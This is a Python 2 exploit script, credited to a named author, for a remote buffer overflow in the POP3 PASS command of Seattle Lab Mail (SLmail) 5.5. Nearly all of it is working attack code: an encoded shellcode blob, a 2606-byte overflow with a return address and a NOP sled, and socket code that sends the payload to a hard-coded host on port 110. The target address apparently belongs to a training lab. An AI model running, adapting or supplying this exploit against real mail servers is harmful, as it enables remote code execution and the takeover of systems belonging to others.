#!/usr/bin/python

# 
# Seattle Lab Mail (SLmail) 5.5 - POP3 'PASS' Remote Buffer Overflow
# Author: Vitor Esperança
#

import socket
import sys

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

shellcode =(
"\xbe\x40\x01\x75\xd7\xda\xc1\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x52\x83\xc0\x04\x31\x70\x0e\x03\x30\x0f\x97\x22\x4c\xe7\xd5"
"\xcd\xac\xf8\xb9\x44\x49\xc9\xf9\x33\x1a\x7a\xca\x30\x4e\x77"
"\xa1\x15\x7a\x0c\xc7\xb1\x8d\xa5\x62\xe4\xa0\x36\xde\xd4\xa3"
"\xb4\x1d\x09\x03\x84\xed\x5c\x42\xc1\x10\xac\x16\x9a\x5f\x03"
"\x86\xaf\x2a\x98\x2d\xe3\xbb\x98\xd2\xb4\xba\x89\x45\xce\xe4"
"\x09\x64\x03\x9d\x03\x7e\x40\x98\xda\xf5\xb2\x56\xdd\xdf\x8a"
"\x97\x72\x1e\x23\x6a\x8a\x67\x84\x95\xf9\x91\xf6\x28\xfa\x66"
"\x84\xf6\x8f\x7c\x2e\x7c\x37\x58\xce\x51\xae\x2b\xdc\x1e\xa4"
"\x73\xc1\xa1\x69\x08\xfd\x2a\x8c\xde\x77\x68\xab\xfa\xdc\x2a"
"\xd2\x5b\xb9\x9d\xeb\xbb\x62\x41\x4e\xb0\x8f\x96\xe3\x9b\xc7"
"\x5b\xce\x23\x18\xf4\x59\x50\x2a\x5b\xf2\xfe\x06\x14\xdc\xf9"
"\x69\x0f\x98\x95\x97\xb0\xd9\xbc\x53\xe4\x89\xd6\x72\x85\x41"
"\x26\x7a\x50\xc5\x76\xd4\x0b\xa6\x26\x94\xfb\x4e\x2c\x1b\x23"
"\x6e\x4f\xf1\x4c\x05\xaa\x92\x78\xd1\xb4\xbe\x15\xe7\xb4\x3f"
"\x5d\x6e\x52\x55\xb1\x27\xcd\xc2\x28\x62\x85\x73\xb4\xb8\xe0"
"\xb4\x3e\x4f\x15\x7a\xb7\x3a\x05\xeb\x37\x71\x77\xba\x48\xaf"
"\x1f\x20\xda\x34\xdf\x2f\xc7\xe2\x88\x78\x39\xfb\x5c\x95\x60"
"\x55\x42\x64\xf4\x9e\xc6\xb3\xc5\x21\xc7\x36\x71\x06\xd7\x8e"
"\x7a\x02\x83\x5e\x2d\xdc\x7d\x19\x87\xae\xd7\xf3\x74\x79\xbf"
"\x82\xb6\xba\xb9\x8a\x92\x4c\x25\x3a\x4b\x09\x5a\xf3\x1b\x9d"
"\x23\xe9\xbb\x62\xfe\xa9\xcc\x28\xa2\x98\x44\xf5\x37\x99\x08"
"\x06\xe2\xde\x34\x85\x06\x9f\xc2\x95\x63\x9a\x8f\x11\x98\xd6"
"\x80\xf7\x9e\x45\xa0\xdd")

buffer = "\x41" * 2606 + "\xe3\x41\x4b\x5f"  +  "\x90" *8 + shellcode


try:
 print "\nSending evil buffer..."
 s.connect(('10.11.5.175',110))
 data = s.recv(1024)
 s.send('USER username' +'\r\n')
 data = s.recv(1024)
 s.send('PASS ' + buffer + '\r\n')
 print "\nDone!."
except:
 print "Could not connect to POP3!"
